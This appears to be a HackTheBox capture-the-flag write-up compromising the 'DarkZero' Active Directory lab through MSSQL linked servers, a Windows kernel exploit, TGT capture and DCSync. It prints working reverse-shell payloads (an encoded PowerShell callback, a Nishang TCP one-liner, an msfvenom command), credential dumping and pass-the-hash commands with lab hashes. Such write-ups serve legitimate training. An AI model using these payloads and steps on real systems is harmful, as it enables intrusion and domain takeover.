---
title: "DarkZero HackTheBox" 
date: 2025-10-04 11:00:00 0000+
tags: [WriteUp, DarkZero, HTB, Enumeration, Active Directory, link_enable_cmdshell, Bloodhound, CVE-2024-30088, Authz_basep, AuthBasepCopyoutInternalSecurityAttributes, windows kernel exploit,PTH, Privilege Escalation, bloodyAD, DCSync, hashcat, Rubeus, tunneling, NTLM Relay, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/DarkZero_HTB/banner.png
---
# DarkZero HTB Writeup

`DarkZero` is a hard-difficulty Windows machine designed around an assumed breach scenario in which the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment with Bidirectional trust, Cross-domain MSSQL Trusted Link, and TGT Delegation. The attacker discovers a misconfigured MSSQL trusted link that points to a different domain (`darkzero.htb` -> `darkzero.ext`), and the remote login has sysadmin privileges. The attacker enables the `xp_cmdshell` procedure as a sysadmin and executes commands. The spawned session under MSSQLSERVICE doesn't have the `SeImpersonatePrivilege`; however, the user account running the service has the `SeServiceLogonRight`. The attacker is forced to change the password and get a new session with Logon Type 5 (Service Logon) to regain those privileges and gain system privileges on the DC02 (`darkzero.ext`). To compromise the `darkzero.htb` domain: the attacker abuses TGT delegation by forcing DC01 to authenticate to DC02, with Unconstrained Delegation enabled.

![image.png](/assets/images/DarkZero_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.244.126
```

![image.png](/assets/images/DarkZero_HTB/image%201.png)

![image.png](/assets/images/DarkZero_HTB/image%202.png)

![image.png](/assets/images/DarkZero_HTB/image%203.png)

Looking at the results we can say that it is an Active Directory Box.

Adding **`DC01.DARKZERO.HTB`**, **DARKZERO.HTB**, **DC01** to our `/etc/hosts` file to resolve the DNS.

Also we need to sync the DC clock which is 7 hours ahead of our local time.

```bash
sudo ntpdate 10.129.244.126
```

### SMB Enumeration

Lets start with the SMB enumeration part first since the ports 139 and 445 are open on the box.

```bash
nxc smb 10.129.244.126 -u 'john.w' -p 'RFulUtONCOL!' --shares
```

![image.png](/assets/images/DarkZero_HTB/image%204.png)

No special unique share found here.

Lets do an **RID Bruteforce** attack to get all the users and machine accounts in the domain.

```bash
nxc smb 10.129.244.126 -u 'john.w' -p 'RFulUtONCOL!' --rid-brute 6000
```

![image.png](/assets/images/DarkZero_HTB/image%205.png)

One big problem solved here is that this is not a big domain 😅

Now I will save all these users to a users-darkzero.txt file.

### Kerberos Authentication

Also lets generate the krb5.conf file of this domain to also authenticate with kerberos incase **NTLM authentication** fails in the future, since I was experiencing some connection issues with the NTLM authentication.

```bash
nxc smb dc01.darkzero.htb --generate-krb5-file darkzero-krb5.conf
```

![image.png](/assets/images/DarkZero_HTB/image%206.png)

Now I will also get a TGT for the john.w user, so that we can authenticate using kerberos.

```bash
impacket-getTGT darkzero.htb/john.w:'RFulUtONCOL!'
```

![image.png](/assets/images/DarkZero_HTB/image%207.png)

Now lets try to access the SMB shares on the box using the kerberos authentication.

```bash
nxc smb dc01.darkzero.htb -k -u 'john.w' -p 'RFulUtONCOL!' --shares
```

![image.png](/assets/images/DarkZero_HTB/image%208.png)

The kerberos authentication also works just fine.

### Bloodhound

Since this is an assumed breach scenario lets collect the data using injestors to analyze it in bloodhound.

Using rusthound-ce to collect the data.

```bash
rusthound-ce -d darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -c All -z --ldaps
```

![image.png](/assets/images/DarkZero_HTB/image%209.png)

Analyzing the bloodhound data from our owned user **John.W,** this user can only enroll some of the default certificates in the domain.

![image.png](/assets/images/DarkZero_HTB/image%2010.png)

This is of no use for us right now.

## Exploitation

### Authentication on DC02.DARKZERO.EXT

The **MSSQL** port is also open on the box.

```bash
nxc mssql 10.129.244.126 -u 'john.w' -p 'RFulUtONCOL!'
```

![image.png](/assets/images/DarkZero_HTB/image%2011.png)

This user had access to the server. Connecting to the remote **MSSQL** server using the windows authentication.

```bash
impacket-mssqlclient  darkzero.htb/'john.w':'RFulUtONCOL!'@dc01.darkzero.htb -windows-auth
```

![image.png](/assets/images/DarkZero_HTB/image%2012.png)

And we have successful authentication.

I tried to do the **UNC Path injection** attack but it gives me the **DC01$** machine account hash.

![image.png](/assets/images/DarkZero_HTB/image%2013.png)

Which is of no use to us and I know this hash is uncrackable.

### Exploiting forest links

While enumerating the links, I found this **DC02.darkzero.ext** link.

![image.png](/assets/images/DarkZero_HTB/image%2014.png)

Similarly we can also find the links using the **NetExec** module.

```bash
nxc mssql dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -M enum_links
```

![image.png](/assets/images/DarkZero_HTB/image%2015.png)

We can extract information using links, as a low privileged user we have these links available to us.

![image.png](/assets/images/DarkZero_HTB/image%2016.png)

Using the **link_enable_cmdshell** module we try to enable the **xp_cmdshell**.

```bash
nxc mssql dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -M link_enable_cmdshell -o ACTION=enable LINKED_SERVER=DC02.DARKZERO.EXT
```

![image.png](/assets/images/DarkZero_HTB/image%2017.png)

Successfully enabled the **xp_cmdshell** on our link **DC02.DARKZERO.EXT.**

Now we try to execute commands on the remote linked server using the **exec_on_link.**

```bash
nxc mssql dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -M exec_on_link -o LINKED_SERVER=DC02.DARKZERO.EXT COMMAND='exec xp_cmdshell whoami'
```

![image.png](/assets/images/DarkZero_HTB/image%2018.png)

We have successful code execution on the remotely linked server.

Lets try to get a shell on the box since we have command injection.

I tried getting a shell on the box using this command and its alternatives but the payload doesn’t get executed.

```bash
nxc mssql dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -M exec_on_link -o LINKED_SERVER=DC02.DARKZERO.EXT COMMAND="xp_cmdshell 'powershell -e JABzAD0AJwAxADAALgAxADAALgAxADQALgAyADYAOgA5ADAAMAAyACcAOwAkAGkAPQAnADgAMwBlADMAYQA2ADcAYwAtAGQAZABlADAAMAAyAGYAZgAtAGIAMAAwADIAMAA2ADYAMAAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA4ADMAZQAzAGEANgA3AGMAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AZQAyADYAMwAtAGIANABkADYAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZABkAGUAMAAwADIAZgBmACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGUAMgA2ADMALQBiADQAZAA2ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvAGIAMAAwADIAMAA2ADYAMAAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGUAMgA2ADMALQBiADQAZAA2ACIAPQAkAGkAfQAgAC0AQgBvAGQAeQAgACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAZQArACQAcgApACAALQBqAG8AaQBuACAAJwAgACcAKQB9ACAAcwBsAGUAZQBwACAAMAAuADgAfQA='"
```

Basically this command should give me a shell back to my machine, but I think the module of **NetExec** is not that good yet cause its a recently introduced module.

I also tried to execute xp_dirtree to get the hash of the **svc_sql** account’s **NetNTLMv2** hash but that too failed.

Now what we will do is manually connect to the **MSSQL** server using Impacket and repeat the same process within the **MSSQL** shell.

```bash
use_link "DC02.darkzero.ext"
```

![image.png](/assets/images/DarkZero_HTB/image%2019.png)

Reenabling the **xp_cmdshell.**

```bash
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

![image.png](/assets/images/DarkZero_HTB/image%2020.png)

Executing commands to get a shell.

![image.png](/assets/images/DarkZero_HTB/image%2021.png)

### Hoaxshell Method

Spinning up **Hoaxshell** to get a encoded payload.

```bash
/opt/hoaxshell/hoaxshell.py -s 10.10.14.26 -p 9002
```

![image.png](/assets/images/DarkZero_HTB/image%2022.png)

We have a shell on **DC02.darkzero.ext** as svc_sql.

Lets list the users on this domain.

![image.png](/assets/images/DarkZero_HTB/image%2023.png)

Now here I was hoping the find the **user.txt** file but it was not there 😑

![image.png](/assets/images/DarkZero_HTB/image%2024.png)

I think we need to escalate our privileges on this DC.

Uploading **winpeasx64.exe**, hopefully the **antivirus is turned off.**

![image.png](/assets/images/DarkZero_HTB/image%2025.png)

But there were some problems as the winpeas execution cant be handled by **hoaxshell**, we need to upgrade our shell.

![image.png](/assets/images/DarkZero_HTB/image%2026.png)

Lets catch this reverse shell in metasploit.

So we are gonna use the Metasploit **/exploit/multi/handler** module, to start a listener.

### Metasploit Execution

```bash
use /exploit/multi/handler
```

![image.png](/assets/images/DarkZero_HTB/image%2027.png)

Now we are gonna use this Nishang payload **Invoke-PowershellTcpOneLine.ps1** and edit it accordingly.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.26',9003);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (/assets/images/DarkZero_HTB/iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Now we **encode** it using this command.

```bash
cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
```

We obtain an base64 encoded payload now lets try to get a shell on the box.

![image.png](/assets/images/DarkZero_HTB/image%2028.png)

Now we have an upgraded shell.

Now running the **winpeas.exe** named as **wp.exe**.

Here is the listing of the winpeas findings.

![image.png](/assets/images/DarkZero_HTB/image%2029.png)

I did not seem to find anything with winpeas too, so I background my current session and invoked the **metasploit** **exploit suggestor** module to find any suitable exploits.

![image.png](/assets/images/DarkZero_HTB/image%2030.png)

Unfortunately the local exploit suggestor failed too!.

But after some attempts when I searched “**Windows 2022 datacenter priv**” in Metasploit I got these 2 exploits.

![image.png](/assets/images/DarkZero_HTB/image%2031.png)

Using the exploit no.2 i.e. the **Windows Kernel Time of check Time of Use LPE in AuthBasepCopyoutInternalSecurityAttributes.**

I will configure the payload and set my **meterpreter** session to it.

![image.png](/assets/images/DarkZero_HTB/image%2032.png)

Now here the thing is our session is a **BSD/SPARC** one and this privilege kernel module requires a **meterpreter** session to be able to run with.

So lets generate a **meterpreter** payload and transfer this payload to our **bsd/sparc** session.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.26 LPORT=9007 -f exe > shell.exe
```

![image.png](/assets/images/DarkZero_HTB/image%2033.png)

Transferred this file to our **BSD/SPARC** reverse shell that we got from the mssql.

Started the **meterpreter** listener on our local machine and configured the exploit accordingly.

Now triggering the transferred shell.exe file on our reverse shell of **bsd/sparc.**

![image.png](/assets/images/DarkZero_HTB/image%2034.png)

This gives us the meterpreter shell as **svc_sql.**

![image.png](/assets/images/DarkZero_HTB/image%2035.png)

Now we are in a more comfortable position on the **DC02.DARKZERO.EXT.**

### Privilege Escalation (DC02.DARKZERO.EXT)

Now we proceed to do the privilege escalation part on **DC02$**.

![image.png](/assets/images/DarkZero_HTB/image%2036.png)

And finally running the exploit gives us this.

Now exploiting this session using our **Windows kernel privilege escalation exploit**.

![image.png](/assets/images/DarkZero_HTB/image%2037.png)

Now we are **NT AUTHORITY\SYSTEM** on **DC02.DARKZERO.EXT.**

Now lets claim our **User flag** on the administrator’s desktop.

![image.png](/assets/images/DarkZero_HTB/image%2038.png)

Lets just dump all the hashes on **DC02.DARKZERO.EXT** using **hashdump** command.

**Hashdump** dumps all the SAM hashes on the local machine.

```bash
hashdump
```

![image.png](/assets/images/DarkZero_HTB/image%2039.png)

## Privilege Escalation (DC01.DARKZERO.HTB)

### Authentication on DC01.DARKZERO.HTB

Now to gain Administrator on **DC01.DARKZERO.HTB** which is in different forest, and We have the system shell in a different forest but here the point is that the 2 **forests** are trusted.

We need DC01 to connect back to DC02 so that we would be able to capture the **dc01’s TGT**.

Also we need to start monitoring on DC02 so that it can capture the TGT of DC01 on it.

In this process we will coerce the DC01 to connect to DC02.

### Rubeus Approach

So let me upload **Rubeus.exe** to our **DC02** SYSTEM shell.

![image.png](/assets/images/DarkZero_HTB/image%2040.png)

Uploaded Rubeus now we have to **route our local machine’s traffic through dc02 to dc01**.

![image.png](/assets/images/DarkZero_HTB/image%2041.png)

Now we run **Rubeus.exe** on **DC02.DARKZERO.EXT**

```powershell
Rubeus.exe monitor /interval:5 /nowrap
```

![image.png](/assets/images/DarkZero_HTB/image%2042.png)

![image.png](/assets/images/DarkZero_HTB/image%2043.png)

Now after **Coercing DC01$** from our **mssql session** → DC01$ tries to connect to DC02$ resulting in successfully capturing the ticket.b64 of the DC01$ machine account.

```sql
xp_dirtree //DC02.darkzero.ext//something//aashwin
```

![image.png](/assets/images/DarkZero_HTB/image%2044.png)

I will now copy this ticket and saved it to a **ticket-dc01.b64** file.

Now we will decode this to **ticket-dc01.kirbi**.

Because in windows the TGT obtained are in the format of **.kirbi** and we need to convert them to **.ccache** if we want to use them in linux.

```bash
impacket-ticketConverter ticket-dc01.kirbi ticket-dc01.ccache
```

![image.png](/assets/images/DarkZero_HTB/image%2045.png)

Now we export this ticket.

```bash
export KRB5CCNAME=ticket-dc01.ccache
klist
```

![image.png](/assets/images/DarkZero_HTB/image%2046.png)

### Shell as Administrator (Secretsdump on DC01$)

Now we simply dump all the domain data using secretsdump.py from the impacket’s collection.

```bash
impacket-secretsdump -k -no-pass darkzero.htb/'DC01$'@dc01.darkzero.htb
```

![image.png](/assets/images/DarkZero_HTB/image%2047.png)

We now have the full domain dump lets verify the shares using NetExec.

```bash
nxc smb darkzero.htb -u 'Administrator' -H '5917507bdf2ef2c2b0a869a1cba40726' --shares
```

![image.png](/assets/images/DarkZero_HTB/image%2048.png)

Lets get a shell on the box using **Evil-winrm** and grab our **root.txt.**

```bash
evil-winrm -i darkzero.htb -u 'Administrator' -H '5917507bdf2ef2c2b0a869a1cba40726'
```

![image.png](/assets/images/DarkZero_HTB/image%2049.png)

Rooted!

![image.png](/assets/images/DarkZero_HTB/image%2050.png)

Thanks for reading 😊✌️
